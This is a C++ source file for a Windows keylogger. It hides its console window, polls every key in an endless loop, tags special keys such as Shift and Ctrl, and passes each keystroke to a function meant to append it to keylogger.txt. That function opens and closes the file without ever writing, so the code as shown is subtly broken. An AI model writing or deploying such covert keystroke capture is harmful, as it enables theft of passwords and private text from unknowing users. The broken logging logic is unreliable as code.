#include<iostream>
#include<fstream>
#include<windows.h>
#include<bits/stdc++.h>

// Log file path
#define LOG_FILE "keylogger.txt"

// Save data into log file
void savedata(std::string data)
{
    std::fstream logFile;

    // Open file
    // std::ios::app will make the new data append to the file instead of erase file content
    // and then write to it
    logFile.open(LOG_FILE ,std::ios::app);

    // close file stream
    logFile.close();
}

std::string tranlatespecialkey(int key)
{
    std::string result;

    switch (key)
    {
    case VK_SPACE:
        // space key
        result=" ";
        break;
    case VK_RETURN:
        // new line 
        // or enter
        result="\n";
        break;
    case VK_BACK:
        //backspace 
        result="\b";
        break;
    case VK_CAPITAL:
        // capslock
        result="[CAPS_LOCK]";
        break;
    case VK_SHIFT:
        // shift
        result="[SHIFT]";
        break;
    case VK_TAB:
        // tab
        result="[TAB]";
        break;
    case VK_CONTROL:
        // control key
        result="[CTRL]";
        break;
    case VK_MENU:
        // alt key
        result="[ALT]";
        break;
    default:
        break;
    }

    return result;
}

int main()
{
    int specialkeyArray[]={ VK_SPACE,VK_RETURN,VK_SHIFT,VK_BACK,VK_TAB,VK_CONTROL,VK_MENU,VK_CAPITAL};
    std::string specialkeychar;
    bool isspecialkey;


    // hide terminal window
    HWND hwnd =GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // loop forever
    while (true)
    {
        // loop through each key
        for(int key=0;key<=190;key++)
        {
            // check key is pressed
            if (GetAsyncKeyState(key)== -32767)
            {
                // key is pressed
                // check if key is special key
                isspecialkey=std::find(std::begin(specialkeyArray),std::end(specialkeyArray),key) !=std::end(specialkeyArray);
                if(isspecialkey)
                {
                    // this is a special key. we need to transelateit
                    specialkeychar=tranlatespecialkey(key);
                    // save data=
                    savedata(specialkeychar);
                }
                else
                {
                    // this is not a specialkey.we need to check if it is uppercase or lowercase
                    if(GetKeyState(VK_CAPITAL))
                    {
                        // capslock is on
                        savedata(std::string(1,(char)key));
                    }
                    else
                    {
                        // capslock is off
                        savedata(std::string(1,(char)std::tolower(key)));
                    }
                    
                }
            }
        }
    }
}